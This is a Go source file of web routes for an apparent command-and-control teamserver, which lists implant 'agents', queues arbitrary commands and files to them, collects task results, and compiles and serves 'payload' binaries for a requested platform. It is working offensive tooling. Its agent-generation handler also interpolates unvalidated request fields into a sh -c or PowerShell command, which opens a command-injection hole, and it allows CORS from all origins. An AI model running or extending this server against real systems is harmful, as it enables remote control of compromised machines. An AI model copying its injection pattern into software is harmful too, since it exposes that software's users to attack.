package routes

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/gerbsec/G2/teamserver/agents"
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func SetupAgentRoutes(r *gin.Engine) {
	config := cors.DefaultConfig()
	config.AllowAllOrigins = true
	config.AllowMethods = []string{"GET", "POST", "PUT", "DELETE"}
	config.AllowHeaders = []string{"Origin", "Content-Length", "Content-Type"}

	r.Use(cors.New(config))
	r.GET("/Agents", getAgents)
	r.GET("/Agents/:agentId", getAgent)
	r.GET("/Agents/:agentId/tasks", getTaskResults)
	r.GET("/Agents/:agentId/tasks/:taskId", getTaskResult)
	r.DELETE("/Agents/:agentId/RemoveAgent", RemoveAgent)
	r.POST("/Agents/:agentId", taskAgent)
	r.POST("/GenerateAgent", generateAgent)
}

func getAgents(c *gin.Context) {
	allAgents := agents.GetServiceInstance().GetAgents()
	for _, agent := range allAgents {
		if time.Since(agent.LastSeen) > 3*time.Minute {
			agents.GetServiceInstance().RemoveAgent(agent)
		}
	}
	c.JSON(http.StatusOK, allAgents)
}

func getAgent(c *gin.Context) {
	agentId := c.Param("agentId")
	agent := agents.GetServiceInstance().GetAgent(agentId)
	if agent == nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}
	c.JSON(http.StatusOK, agent)
}

func getTaskResults(c *gin.Context) {
	agentId := c.Param("agentId")
	agent := agents.GetServiceInstance().GetAgent(agentId)
	if agent == nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}
	results := agent.GetTaskResults()
	c.JSON(http.StatusOK, results)
}

func getTaskResult(c *gin.Context) {
	agentId := c.Param("agentId")
	taskId := c.Param("taskId")
	agent := agents.GetServiceInstance().GetAgent(agentId)
	if agent == nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}
	result := agent.GetTaskResult(taskId)
	if result == nil {
		c.String(http.StatusNotFound, "Task not found")
		return
	}
	c.JSON(http.StatusOK, result)
}

type AgentGen struct {
	OS           string `json:"os"`
	Architecture string `json:"arch"`
}

func generateAgent(c *gin.Context) {
	var a AgentGen
	if err := c.BindJSON(&a); err != nil {
		c.String(http.StatusBadRequest, "Data incorrect")
		return
	}
	var cmd []string
	if runtime.GOOS == "windows" {
		cmd = []string{"powershell.exe", "/c"}
	} else {
		cmd = []string{"sh", "-c"}
	}
	command := exec.Command(cmd[0], cmd[1], fmt.Sprintf("env GOOS=%s GOARCH=%s go build -o payload ../agent/main.go", a.OS, a.Architecture))
	if err := command.Run(); err != nil {
		log.Fatal(err)
	}
	byteFile, err := os.ReadFile("./payload")
	if err != nil {
		fmt.Println(err)
	}

	c.Header("Content-Disposition", "attachment; filename=file-name.txt")
	c.Data(http.StatusOK, "application/octet-stream", byteFile)
}

type TaskAgentRequest struct {
	Command   string   `json:"command"`
	Arguments []string `json:"arguments"`
	File      []byte   `json:"file"`
}

func taskAgent(c *gin.Context) {
	agentId := c.Param("agentId")
	var request TaskAgentRequest
	if err := c.BindJSON(&request); err != nil {
		c.String(http.StatusBadRequest, "Invalid request body")
		return
	}

	agent := agents.GetServiceInstance().GetAgent(agentId)
	if agent == nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	task := &agents.AgentTask{
		Id:        uuid.New().String(),
		Command:   request.Command,
		Arguments: request.Arguments,
		File:      request.File,
	}

	agent.QueueTask(task)

	root := "http://" + c.Request.Host + c.Request.URL.Path
	path := root + "/tasks/" + task.Id

	c.JSON(http.StatusCreated, gin.H{"task": task, "path": path})
}

func RemoveAgent(c *gin.Context) {
	agentId := c.Param("agentId")
	agent := agents.GetServiceInstance().GetAgent(agentId)
	agents.GetServiceInstance().RemoveAgent(agent)
}
